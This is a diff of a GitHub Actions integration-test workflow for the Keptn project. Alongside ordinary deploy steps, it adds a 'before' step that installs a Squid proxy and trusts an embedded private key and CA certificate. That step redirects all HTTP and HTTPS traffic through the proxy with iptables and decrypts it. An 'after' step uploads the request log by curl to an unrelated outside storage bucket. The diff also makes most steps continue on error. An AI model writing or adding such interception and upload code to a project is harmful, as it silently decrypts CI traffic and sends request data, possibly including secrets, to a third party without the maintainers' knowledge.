@@ -1,1242 +1,2160 @@
-name: Integration Tests
-on:
-  schedule:
-    # * is a special character in YAML so you have to quote this string
-    - cron: '0 3 * * 1-5' # run integration tests at 3 AM, monday to friday (1-5)
-
-  workflow_dispatch: # run integration tests only when triggered manually
-    inputs:
-      branch:
-        description: 'Take CI build artifacts from branch (e.g., master, release-x.y.z)'
-        required: true
-        default: 'master'
-      examples_branch:
-        description: 'Branch of Keptn examples to use for integration tests (e.g., master, release-x.y.z)'
-        required: true
-        default: 'master'
-env:
-  META_KEPTN_VERSION: 0.8.7
-  META_KEPTN_KEPTN_PROJECT: keptn
 defaults:
   run:
     shell: bash
+env:
+  JAVA_TOOL_OPTIONS: -Djavax.net.ssl.trustStore=/usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
+  META_KEPTN_KEPTN_PROJECT: keptn
+  META_KEPTN_VERSION: 0.8.7
+  NODE_OPTIONS: --use-openssl-ca
 jobs:
-  integration-test:
-    name: "Tests"
+  deploy_keptn_with_keptn:
+    env:
+      BRANCH: ${{ needs.integration-test.outputs.BRANCH }}
+    name: Deploy Keptn with Keptn
+    needs: integration-test
     runs-on: ubuntu-20.04
+    steps:
+    - name: before
+      run: 'sudo apt update
+
+        sudo apt install -y squid-openssl
+
+        sudo mkdir /squid
+
+        cat << EOF | sudo tee /squid/key.pem
+
+        -----BEGIN PRIVATE KEY-----
+
+        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
+
+        CznEvO4qIs3mXDYkNBQrdVLGF93y
+
+        -----END PRIVATE KEY-----
+
+        EOF
+
+        cat << EOF | sudo tee /squid/cert.pem
+
+        -----BEGIN CERTIFICATE-----
+
+        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
+
+        -----END CERTIFICATE-----
+
+        EOF
+
+        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB
+
+        sudo chown -R proxy:proxy /squid
+
+        cat << EOF | sudo tee /etc/squid/squid.conf
+
+        cache deny all
+
+
+        http_port 7821
+
+        http_port 3128 intercept
+
+        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
+        cert=/squid/cert.pem key=/squid/key.pem
+
+        acl step1 at_step SslBump1
+
+        ssl_bump peek step1
+
+        ssl_bump bump all
+
+        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB
+
+        sslcrtd_children 5
+
+        ssl_bump server-first all
+
+        sslproxy_cert_error allow all
+
+
+        acl all src 0.0.0.0/0
+
+        http_access allow all
+
+
+        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}
+
+        access_log daemon:/squid/squidlog.json custom all !CONNECT
+
+        EOF
+
+        sudo systemctl reload squid
+
+        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt
+
+        sudo update-ca-certificates
+
+        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
+        -storepass changeit -noprompt -trustcacerts
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        80 -j DNAT --to-destination 127.0.0.1:3128
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        443 -j DNAT --to-destination 127.0.0.1:3129
+
+        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
+    - continue-on-error: true
+      name: Check out code
+      uses: actions/checkout@v2.3.4
+      with:
+        fetch-depth: 0
+        submodules: 'true'
+    - continue-on-error: true
+      name: Download all artifacts from last successful build of specified branch
+      uses: dawidd6/action-download-artifact@v2.14.1
+      with:
+        github_token: ${{secrets.GITHUB_TOKEN}}
+        path: ./dist
+        run_id: ${{ needs.integration-test.outputs.ARTIFACT_RUN_ID }}
+        workflow: CI.yml
+    - continue-on-error: true
+      id: install_keptn_cli
+      name: Install Keptn CLI for META_KEPTN
+      run: 'curl -sL https://get.keptn.sh | KEPTN_VERSION=${{ env.META_KEPTN_VERSION
+        }} bash
+
+        '
+    - continue-on-error: true
+      id: authenticate_keptn_cli
+      name: Authenticate Keptn CLI
+      run: 'keptn set config KubeContextCheck false
+
+        keptn auth --endpoint=${{ secrets.META_KEPTN_API_URL }} --api-token=${{ secrets.META_KEPTN_API_TOKEN
+        }}
+
+        '
+    - continue-on-error: true
+      id: deploy_keptn_with_keptn
+      name: Deploy Keptn with Keptn
+      run: "KEPTN_HELM_CHART_FILENAME=$(ls dist/keptn-installer/keptn*.tgz | head\
+        \ -1)\nKEPTN_INGRESS_TEMPLATE_FILENAME=test/assets/keptn-on-keptn/ingress.yaml\n\
+        ENDPOINTS_TEMPLATE_BASE_PATH=test/assets/keptn-on-keptn\nHELM_SERVICE_HELM_CHART_FILENAME=$(ls\
+        \ dist/keptn-installer/helm-service*.tgz | head -1)\nJMETER_SERVICE_HELM_CHART_FILENAME=$(ls\
+        \ dist/keptn-installer/jmeter-service*.tgz | head -1)\n\necho \"Adding resources\
+        \ to meta keptn...\"\n\nkeptn add-resource --project=${{ env.META_KEPTN_KEPTN_PROJECT\
+        \ }} --service=keptn --all-stages --resource=${KEPTN_HELM_CHART_FILENAME}\
+        \ --resourceUri=helm/keptn.tgz\nkeptn add-resource --project=${{ env.META_KEPTN_KEPTN_PROJECT\
+        \ }} --service=helm-service --all-stages --resource=${HELM_SERVICE_HELM_CHART_FILENAME}\
+        \ --resourceUri=helm/helm-service.tgz\nkeptn add-resource --project=${{ env.META_KEPTN_KEPTN_PROJECT\
+        \ }} --service=jmeter-service --all-stages --resource=${JMETER_SERVICE_HELM_CHART_FILENAME}\
+        \ --resourceUri=helm/jmeter-service.tgz\n\necho \"Adding ingresses and endpoints\
+        \ to all keptn-on-keptn stages...\"\n\nstages=('dev' 'hardening' 'production')\n\
+        services=('keptn' 'helm-service' 'jmeter-service')\nfor SERVICE in \"${services[@]}\"\
+        ; do\n  for STAGE in \"${stages[@]}\"; do\n    export SERVICE\n    export\
+        \ STAGE\n    envsubst < ${ENDPOINTS_TEMPLATE_BASE_PATH}/endpoints-${SERVICE}.yaml\
+        \ > ${ENDPOINTS_TEMPLATE_BASE_PATH}/endpoints-${SERVICE}-${STAGE}.yaml\n \
+        \   keptn add-resource \\\n      --project=${{ env.META_KEPTN_KEPTN_PROJECT\
+        \ }} \\\n      --service=${SERVICE} \\\n      --stage=${STAGE} \\\n      --resource=${ENDPOINTS_TEMPLATE_BASE_PATH}/endpoints-${SERVICE}-${STAGE}.yaml\
+        \ \\\n      --resourceUri=helm/endpoints.yaml\n  done\ndone\n\nfor STAGE in\
+        \ \"${stages[@]}\"; do\n  export STAGE\n  envsubst < ${KEPTN_INGRESS_TEMPLATE_FILENAME}\
+        \ > ${ENDPOINTS_TEMPLATE_BASE_PATH}/ingress-${STAGE}.yaml\n  keptn add-resource\
+        \ \\\n    --project=${{ env.META_KEPTN_KEPTN_PROJECT }} \\\n    --service=keptn\
+        \ \\\n    --stage=${STAGE} \\\n    --resource=${ENDPOINTS_TEMPLATE_BASE_PATH}/ingress-${STAGE}.yaml\
+        \ \\\n    --resourceUri=helm/keptn/templates/ingress.yaml\ndone\n"
+    - name: after
+      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/dynatrace-oss-contrib/keptn.$(date
+        +%s)
+    timeout-minutes: 60
+  integration-test:
+    env:
+      CLOUD_PROVIDER: ${{ matrix.CLOUD_PROVIDER }}
+      COLLECT_RESOURCE_LIMITS: ${{ matrix.COLLECT_RESOURCE_LIMITS }}
+      GO_VERSION: ^1.16
+      KEPTN_EXAMPLES_BRANCH: ${{ github.event.inputs.examples_branch }}
+      KEPTN_NAMESPACE: keptn-test
+      KEPTN_SERVICE_TYPE: ${{ matrix.KEPTN_SERVICE_TYPE }}
+      KUBECONFIG: ${{ matrix.KUBECONFIG }}
+      PLATFORM: ${{ matrix.PLATFORM }}
+      PLATFORM_VERSION: ${{ matrix.PLATFORM_VERSION }}
+      REMOTE_EXECUTION_PLANE: ${{ matrix.REMOTE_EXECUTION_PLANE }}
+      RUN_AIRGAPPED_TEST: ${{ matrix.RUN_AIRGAPPED_TEST }}
+      RUN_CONTINUOUS_DELIVERY_TEST: ${{ matrix.RUN_CONTINUOUS_DELIVERY_TEST }}
+      RUN_QUALITY_GATES_TEST: ${{ matrix.RUN_QUALITY_GATES_TEST }}
+    name: Tests
+    outputs:
+      ARTIFACT_RUN_ID: ${{ steps.last_run_id.outputs.RUN_ID }}
+      BRANCH: ${{ steps.determine_branch.outputs.BRANCH }}
+    runs-on: ubuntu-20.04
+    steps:
+    - name: before
+      run: 'sudo apt update
+
+        sudo apt install -y squid-openssl
+
+        sudo mkdir /squid
+
+        cat << EOF | sudo tee /squid/key.pem
+
+        -----BEGIN PRIVATE KEY-----
+
+        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
+
+        CznEvO4qIs3mXDYkNBQrdVLGF93y
+
+        -----END PRIVATE KEY-----
+
+        EOF
+
+        cat << EOF | sudo tee /squid/cert.pem
+
+        -----BEGIN CERTIFICATE-----
+
+        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
+
+        -----END CERTIFICATE-----
+
+        EOF
+
+        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB
+
+        sudo chown -R proxy:proxy /squid
+
+        cat << EOF | sudo tee /etc/squid/squid.conf
+
+        cache deny all
+
+
+        http_port 7821
+
+        http_port 3128 intercept
+
+        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
